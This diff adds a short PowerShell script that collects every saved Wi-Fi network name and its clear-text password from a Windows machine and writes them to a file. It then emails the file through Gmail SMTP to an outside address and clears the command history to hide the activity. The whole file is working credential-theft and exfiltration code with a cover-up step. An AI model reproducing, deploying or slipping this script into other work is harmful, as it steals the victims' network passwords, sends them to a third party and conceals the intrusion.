@@ -1,0 +1,5 @@
+(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-File -FilePath .\${env:UserName}.txt
+
+$SMTPServer = 'smtp.gmail.com'; $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('DUMMY_EMAIL@gmail.com', 'DUMMY_EMAIL_PASSWORD'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'DUMMY_EMAIL@gmail.com'; $ReportEmail.To.Add('EMAIL@gmail.com'); $ReportEmail.Subject = ${env:UserName} + ' wifi pass'; $ReportEmail.Body = (Get-Content "${env:UserName}.txt" | out-string); $SMTPInfo.Send($ReportEmail);
+
+Clear-History
